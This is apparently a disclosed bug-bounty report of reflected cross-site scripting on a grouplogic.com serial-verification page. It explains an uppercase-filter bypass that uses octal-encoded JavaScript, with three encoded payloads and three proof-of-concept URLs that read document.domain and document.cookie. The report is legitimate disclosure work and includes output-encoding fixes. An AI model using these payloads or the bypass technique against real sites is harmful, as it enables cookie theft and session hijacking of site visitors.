# Reflected Cross Site Scripting at http://www.grouplogic.com/files/glidownload/verify3.asp [Uppercase Filter Bypass]

## Report Details
- **Report ID**: 1167034
- **URL**: https://hackerone.com/reports/1167034
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-04-17T03:24:16.145Z
- **Disclosed**: 2022-06-14T10:20:24.701Z

## Reporter
- **Username**: ub3rsick
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary
The below URL checks if the product serial number provided in the url parameter **serial** is valid or not.
```
http://www.grouplogic.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=<product serial here>
```
If an invalid product serial is provided, the user submitted serial is displayed in the response. It was observed that the serial parameter is properly sanitized and is displayed in the response without output encoding. However, the **input characters were converted to UPPERCASE**, this prevented any attempts to inject arbitrary JavaScript code inside event handlers as UPPERCASE JavaScript built in functions are not executed. ie, **alert() != ALERT()**.

However, if the input JavaScript does not contain any alphabets, they are not converted into uppercase and the JavaScript would get executed. This can be achieved by encoding the characters.

Below reference was used in encoding strings so that only numbers were present in injected JavaScript.
Reference: https://www.ic.unicamp.br/~stolfi/EXPORT/www/ISO-8859-1-Encoding.html

Inject any of below payloads in **serial** parameter to trigger XSS.

Payload to run **alert(1)** :
```
[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164\50\61\51")()
```
Payload to run **alert(document.domain)** :
```
[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\144\157\155\141\151\156\51")()
```
Payload to run **alert(document.cookie)** :
```
[]["\146\151\154\164\145\162"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\143\157\157\153\151\145\51")()
```

## Steps To Reproduce
Navigate to any of  below URL from a browser to trigger XSS:

```
PoC 1:
http://www.grouplogic.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Ch1+onmouseover=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\162%22](%22\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\144\157\155\141\151\156\51%22)()%3Etest%3C/h1%3E

PoC 2:
http://www.grouplogic.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Cimg+src=x+onerror=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\162%22](%22\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\144\157\155\141\151\156\51%22)()%3Etest%3C/h1%3E

PoC3:
http://www.grouplogic.com/files/glidownload/verify3.asp?version=CC1100x7660&serial=%3Cimg+src=x+onerror=[][%22\146\151\154\164\145\162%22][%22\143\157\156\163\164\162\165\143\164\157\162%22](%22\141\154\145\162\164\50\144\157\143\165\155\145\156\164\056\143\157\157\153\151\145\51%22)()%3Etest%3C/h1%3E
```

## Recommendations
It is highly recommended to implement output encoding.
Encode the following characters with HTML entity encoding to prevent switching into any execution context, such as script, style, or event handlers. Using hex entities is recommended in the spec. The 5 characters significant in XML ```(&, <, >, ", ')```:

```
 & --> &amp;
 < --> &lt;
 > --> &gt;
 " --> &quot;
 ' --> &#x27;
```

Reference: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

## Impact

XSS can be used to :
- Steal cookies, password
- Website Defacement
- Redirect Victim to Malicious site
- Log keystrokes etc.

## Attachments
- grouplogic-licensepage-xss-reflected-filter-bypass_01.png
- grouplogic-licensepage-xss-reflected-filter-bypass_02.png
- grouplogic-licensepage-xss-reflected-filter-bypass.webm
- grouplogic-licensepage-xss-reflected-filter-bypass_03.png
- grouplogic-licensepage-xss-reflected-filter-bypass_05-xss-domain.png
- grouplogic-licensepage-xss-reflected-filter-bypass_04-onmouseover-domain.png
- grouplogic-licensepage-xss-reflected-filter-bypass_06-xss-cookie.png
